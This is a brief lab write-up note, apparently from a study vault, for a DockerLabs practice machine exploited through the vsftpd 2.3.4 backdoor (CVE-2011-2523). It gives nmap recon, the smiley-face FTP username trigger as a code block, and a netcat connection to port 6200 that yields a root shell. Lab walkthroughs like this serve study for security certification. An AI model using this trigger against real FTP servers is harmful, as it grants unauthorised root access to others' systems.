---
type: machine
platform: dockerlabs
difficulty: super-easy
ip: 172.17.0.2
cves: [CVE-2011-2523]
tools: [nmap, telnet, netcat]
techniques: [vsftpd-backdoor]
tags: [ejpt:assessment, ejpt:host-net-pentest]
related: ["[[tproot]]"]
---

# First Hacking

**Writeup:** [raw writeup](../../writeups/dockerlabs/super-easy/first-hacking.md)

Intro box demonstrating the [[vsftpd-backdoor|vsftpd 2.3.4 backdoor]] ([[cve-2011-2523]]).

## Path

1. **Recon** — `nmap` reveals `21/tcp ftp vsftpd 2.3.4`, an outdated version with a known backdoor.
2. **Exploit** — trigger the backdoor via a crafted FTP username:
   ```
   USER anonymous:)
   PASS password
   ```
3. **Shell** — connect to the backdoor listener on port 6200 with `nc`, run `whoami` → `root`.

## Takeaways

- Version-specific vulnerability: spotting `vsftpd 2.3.4` in the nmap banner is an immediate red flag.
- The smiley-face trigger (`:)` in the username) is the signature of [[cve-2011-2523]].
